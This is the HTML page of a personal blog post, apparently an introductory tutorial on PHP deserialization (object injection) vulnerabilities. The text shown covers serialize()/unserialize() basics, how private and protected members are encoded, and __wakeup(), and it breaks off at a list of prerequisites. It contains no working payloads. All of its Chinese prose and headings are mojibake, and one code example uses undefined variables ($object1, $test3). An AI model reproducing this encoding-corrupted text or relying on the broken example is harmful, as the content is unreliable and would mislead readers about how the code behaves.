<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>ÂàùËØÜPHPÂèçÂ∫èÂàóÂåñ | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"NpcÂ∞èÁ´ô","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="Ê¶ÇÂøµ  Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ Â∫èÂàóÂåñÁ§∫‰æã &lt;?php  class test&#123;      public $name &#x3D; &#39;P2hm1n&#39;;        private $sex &#x3D; &#39;secret&#39;;        protected $age &#x3D; &#39;20&#39;;  &#125;  $test1 &#x3D; new test();  $object &#x3D; serialize($test1);">
<meta property="og:type" content="article">
<meta property="og:title" content="ÂàùËØÜPHPÂèçÂ∫èÂàóÂåñ">
<meta property="og:url" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Npc | Blog">
<meta property="og:description" content="Ê¶ÇÂøµ  Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ Â∫èÂàóÂåñÁ§∫‰æã &lt;?php  class test&#123;      public $name &#x3D; &#39;P2hm1n&#39;;        private $sex &#x3D; &#39;secret&#39;;        protected $age &#x3D; &#39;20&#39;;  &#125;  $test1 &#x3D; new test();  $object &#x3D; serialize($test1);">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703165137530.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703181936938.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703192958671.png">
<meta property="article:published_time" content="2024-07-01T14:39:21.000Z">
<meta property="article:modified_time" content="2024-07-03T12:05:15.674Z">
<meta property="article:author" content="Npc">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703165137530.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">üò≠</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">ÊÉ≥s</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">45</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">12</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ÁïôË®ÄÊùø"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="ÊàëÁöÑÂ∞è‰ºô‰º¥‰ª¨" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text"> Ê¶ÇÂøµ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text"> Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> ‰∫ßÁîüÂéüÂõ†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E7%9A%84%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text"> PHPÁöÑÈ≠îÊ≥ïÊñπÊ≥ï</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text"> Â∏∏ËßÅÊîªÂáª</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-number">2.1.</span> <span class="toc-text"> ‰æãÈ¢ò1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#__wakeup%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text"> __wakeup()ÂáΩÊï∞ÁªïËøá</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">2.3.</span> <span class="toc-text"> ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.3.1.</span> <span class="toc-text"> ÂâçÁΩÆÁü•ËØÜÔºö</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E6%9B%BF%E6%8D%A2%E4%BF%AE%E6%94%B9%E5%90%8E%E5%AF%BC%E8%87%B4%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E9%95%BF"><span class="toc-number">2.3.2.</span> <span class="toc-text"> ‰∏ÄÊõøÊç¢‰øÆÊîπÂêéÂØºËá¥Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèòÈïø</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%9B%BF%E6%8D%A2%E4%B9%8B%E5%90%8E%E5%AF%BC%E8%87%B4%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E7%9F%AD"><span class="toc-number">2.3.3.</span> <span class="toc-text"> ‰∫åÊõøÊç¢‰πãÂêéÂØºËá¥Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèòÁü≠</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.4.</span> <span class="toc-text"> pharÂèçÂ∫èÂàóÂåñ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="toc-number">2.4.1.</span> <span class="toc-text"> ÂâçÁΩÆÁü•ËØÜ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.4.2.</span> <span class="toc-text"> Âà©Áî®Êù°‰ª∂</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.3.</span> <span class="toc-text"> Êñá‰ª∂Êìç‰ΩúÂáΩÊï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.4.</span> <span class="toc-text"> ÁªïËøáÊñπÊ≥ï</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.5.</span> <span class="toc-text"> sessionÂèçÂ∫èÂàóÂåñ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%80%A0%E6%88%90%E5%8E%9F%E7%90%86"><span class="toc-number">2.5.1.</span> <span class="toc-text"> ÊºèÊ¥ûÈÄ†ÊàêÂéüÁêÜÔºö</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ÂàùËØÜPHPÂèçÂ∫èÂàóÂåñ</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-07-01 22:39:21" itemprop="dateCreated datePublished" datetime="2024-07-01T22:39:21+08:00">2024-07-01</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-07-03 20:05:15" itemprop="dateModified" datetime="2024-07-03T20:05:15+08:00">2024-07-03</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">5.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">21m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="Ê¶ÇÂøµ"><a class="markdownIt-Anchor" href="#Ê¶ÇÂøµ"></a> Ê¶ÇÂøµ</h2>
<h3 id="Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ"><a class="markdownIt-Anchor" href="#Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ"></a> Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ</h3>
<p>Â∫èÂàóÂåñÁ§∫‰æã</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'P2hm1n'</span><span class="token punctuation">;</span>  

    <span class="token keyword">private</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'secret'</span><span class="token punctuation">;</span>  

    <span class="token keyword">protected</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'20'</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#O:4:"test":3:&#123;s:4:"name";s:6:"P2hm1n";s:9:"testsex";s:6:"secret";s:6:"*age";s:2:"20";&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÂÖ≥ÈîÆÂáΩÊï∞ serialize():Â∞ÜPHP‰∏≠ÂàõÂª∫ÁöÑÂØπË±°ÔºåÂèòÊàê‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤</p>
<p>privateÂ±ûÊÄßÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊ†ºÂºèÊòØ %00Á±ªÂêç%00ÊàêÂëòÂêç</p>
<p>protectedÂ±ûÊÄßÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊ†ºÂºèÊòØ %00*%00ÊàêÂëòÂêç</p>
<p>ÂÖ≥ÈîÆË¶ÅÁÇπÔºö</p>
<p>Âú®Private ÊùÉÈôêÁßÅÊúâÂ±ûÊÄßÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊ†ºÂºèÊòØ %00Á±ªÂêç%00Â±ûÊÄßÂêç</p>
<p>Âú®Protected ÊùÉÈôêÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊ†ºÂºèÊòØ %00*%00Â±ûÊÄßÂêç</p>
<pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">ËØ∑ËÆ∞‰ΩèÔºåÂ∫èÂàóÂåñÂè™Â∫èÂàóÂåñÂ±ûÊÄßÔºå‰∏çÂ∫èÂàóÂåñÊñπÊ≥ïÔºåËøô‰∏™ÊÄßË¥®Â∞±ÂºïÂá∫‰∫Ü‰∏§‰∏™ÈùûÂ∏∏ÈáçË¶ÅÁöÑËØùÈ¢òÔºö<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(1)Êàë‰ª¨Âú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄô‰∏ÄÂÆöË¶Å‰øùËØÅÂú®ÂΩìÂâçÁöÑ‰ΩúÁî®ÂüüÁéØÂ¢É‰∏ãÊúâËØ•Á±ªÂ≠òÂú®</p>
<p>ËøôÈáå‰∏çÂæó‰∏çÊâØÂá∫ÂèçÂ∫èÂàóÂåñÁöÑÈóÆÈ¢òÔºåËøôÈáåÂÖàÁÆÄÂçïËØ¥‰∏Ä‰∏ãÔºåÂèçÂ∫èÂàóÂåñÂ∞±ÊòØÂ∞ÜÊàë‰ª¨ÂéãÁº©Ê†ºÂºèÂåñÁöÑÂØπË±°ËøòÂéüÊàêÂàùÂßãÁä∂ÊÄÅÁöÑËøáÁ®ãÔºàÂèØ‰ª•ËÆ§‰∏∫ÊòØËß£ÂéãÁº©ÁöÑËøáÁ®ãÔºâÔºåÂõ†‰∏∫Êàë‰ª¨Ê≤°ÊúâÂ∫èÂàóÂåñÊñπÊ≥ïÔºåÂõ†Ê≠§Âú®ÂèçÂ∫èÂàóÂåñ‰ª•ÂêéÊàë‰ª¨Â¶ÇÊûúÊÉ≥Ê≠£Â∏∏‰ΩøÁî®Ëøô‰∏™ÂØπË±°ÁöÑËØùÊàë‰ª¨ÂøÖÈ°ªË¶Å‰æùÊâò‰∫éËøô‰∏™Á±ªË¶ÅÂú®ÂΩìÂâç‰ΩúÁî®ÂüüÂ≠òÂú®ÁöÑÊù°‰ª∂„ÄÇ</p>
<p>(2)Êàë‰ª¨Âú®ÂèçÂ∫èÂàóÂåñÊîªÂáªÁöÑÊó∂ÂÄô‰πüÂ∞±ÊòØ‰æùÊâòÁ±ªÂ±ûÊÄßËøõË°åÊîªÂáª</p>
<p>Âõ†‰∏∫Ê≤°ÊúâÂ∫èÂàóÂåñÊñπÊ≥ïÂòõÔºåÊàë‰ª¨ËÉΩÊéßÂà∂ÁöÑÂè™ÊúâÁ±ªÁöÑÂ±ûÊÄßÔºåÂõ†Ê≠§Á±ªÂ±ûÊÄßÂ∞±ÊòØÊàë‰ª¨ÂîØ‰∏ÄÁöÑÊîªÂáªÂÖ•Âè£ÔºåÂú®Êàë‰ª¨ÁöÑÊîªÂáªÊµÅÁ®ã‰∏≠ÔºåÊàë‰ª¨Â∞±ÊòØË¶ÅÂØªÊâæÂêàÈÄÇÁöÑËÉΩË¢´Êàë‰ª¨ÊéßÂà∂ÁöÑÂ±ûÊÄßÔºåÁÑ∂ÂêéÂà©Áî®ÂÆÉÊú¨Ë∫´ÁöÑÂ≠òÂú®ÁöÑÊñπÊ≥ïÔºåÂú®Âü∫‰∫éÂ±ûÊÄßË¢´ÊéßÂà∂ÁöÑÊÉÖÂÜµ‰∏ãÂèëÂä®Êàë‰ª¨ÁöÑÂèëÂ∫èÂàóÂåñÊîªÂáªÔºàËøôÊòØÊàë‰ª¨ÊîªÂáªÁöÑÊ†∏ÂøÉÊÄùÊÉ≥ÔºåËøôÈáåÂÖàÂÄüÊ≠§Êú∫‰ºöÊäõÂá∫Êù•ÔºåÂ§ßÂÆ∂Êúâ‰∏Ä‰∏™Âç∞Ë±°Ôºâ</p>
<p>ÂèçÂ∫èÂàóÂåñÁ§∫‰æã</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:4:"test":3:&#123;s:4:"name";s:6:"P2hm1n";s:9:"testsex";s:6:"secret";s:6:"*age";s:2:"20";&#125;'</span><span class="token punctuation">;</span>

<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$object1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÂÖ≥ÈîÆÂáΩÊï∞ unserialize():Â∞ÜÁªèËøáÂ∫èÂàóÂåñÁöÑÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢ÂõûPHPÂÄº</p>
<p>ÂΩìÊúâ protected Âíå private Â±ûÊÄßÁöÑÊó∂ÂÄôËÆ∞ÂæóË°•ÈΩêÁ©∫ÁöÑÂ≠óÁ¨¶‰∏≤</p>
<p>__wakeup()È≠îÊúØÊñπÊ≥ï</p>
<p>unserialize() ‰ºöÊ£ÄÊü•ÊòØÂê¶Â≠òÂú®‰∏Ä‰∏™ __wakeup() ÊñπÊ≥ï„ÄÇÂ¶ÇÊûúÂ≠òÂú®ÔºåÂàô‰ºöÂÖàË∞ÉÁî® __wakeup ÊñπÊ≥ïÔºåÈ¢ÑÂÖàÂáÜÂ§áÂØπË±°ÈúÄË¶ÅÁöÑËµÑÊ∫ê„ÄÇ</p>
<p>Â∫èÂàóÂåñpublic private protectÂèÇÊï∞‰∫ßÁîü‰∏çÂêåÁªìÊûú</p>
<p>privateÁöÑÂèÇÊï∞Ë¢´ÂèçÂ∫èÂàóÂåñÂêéÂèòÊàê \00test\00test1 publicÁöÑÂèÇÊï∞ÂèòÊàê test2 protectedÁöÑÂèÇÊï∞ÂèòÊàê \00*\00test3</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$test1</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$test2</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$test3</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token comment">//  O:4:"test":3:&#123;s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="‰∫ßÁîüÂéüÂõ†"><a class="markdownIt-Anchor" href="#‰∫ßÁîüÂéüÂõ†"></a> ‰∫ßÁîüÂéüÂõ†</h3>
<p>PHP ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂèàÂè´ÂÅö PHP ÂØπË±°Ê≥®ÂÖ•ÊºèÊ¥ûÔºåÊòØÂõ†‰∏∫Á®ãÂ∫èÂØπËæìÂÖ•Êï∞ÊçÆÂ§ÑÁêÜ‰∏çÂΩìÂØºËá¥ÁöÑ.</p>
<p>ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÊàêÂõ†Âú®‰∫é‰ª£Á†Å‰∏≠ÁöÑ unserialize() Êé•Êî∂ÁöÑÂèÇÊï∞ÂèØÊéßÔºå‰ªé‰∏äÈù¢ÁöÑ‰æãÂ≠êÁúãÔºåËøô‰∏™ÂáΩÊï∞ÁöÑÂèÇÊï∞ÊòØ‰∏Ä‰∏™Â∫èÂàóÂåñÁöÑÂØπË±°ÔºåËÄåÂ∫èÂàóÂåñÁöÑÂØπË±°Âè™Âê´ÊúâÂØπË±°ÁöÑÂ±ûÊÄßÔºåÈÇ£Êàë‰ª¨Â∞±Ë¶ÅÂà©Áî®ÂØπÂØπË±°Â±ûÊÄßÁöÑÁØ°ÊîπÂÆûÁé∞ÊúÄÁªàÁöÑÊîªÂáª„ÄÇ</p>
<p>ÈúÄË¶ÅÂÖ∑Â§áÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂâçÊèêÔºö</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">ÂøÖÈ°ªÊúâ <span class="token function">unserailize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ÂáΩÊï∞

